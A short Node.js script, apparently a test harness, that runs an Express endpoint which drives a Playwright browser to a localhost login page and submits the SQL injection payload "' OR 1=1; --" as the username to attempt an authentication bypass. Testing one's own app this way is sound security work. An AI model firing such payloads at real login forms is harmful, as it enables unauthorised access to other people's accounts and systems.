const express = require('express');
const { chromium } = require('playwright');

const app = express();

app.get('/run-task', async (req, res) => {
  const browser = await chromium.launch({ headless: false });
  const page = await browser.newPage();

  await page.goto('http://localhost:3000/');
//   await page.click('button');

//  Enter the SQL injection payload in the username field
  await page.fill('input[name="username"]', "' OR 1=1; --");

//  Enter a placeholder password
  await page.fill('input[name="password"]', "password");

//  Click the login button
  await page.click('button:text("Login")');

  const result = await page.content();

  // Wait 10 seconds before closing the browser
  await new Promise(resolve => setTimeout(resolve, 10000));
  
  await browser.close();
  res.send({ result });
});

app.listen(3001, () => console.log('Server running on port 3001'));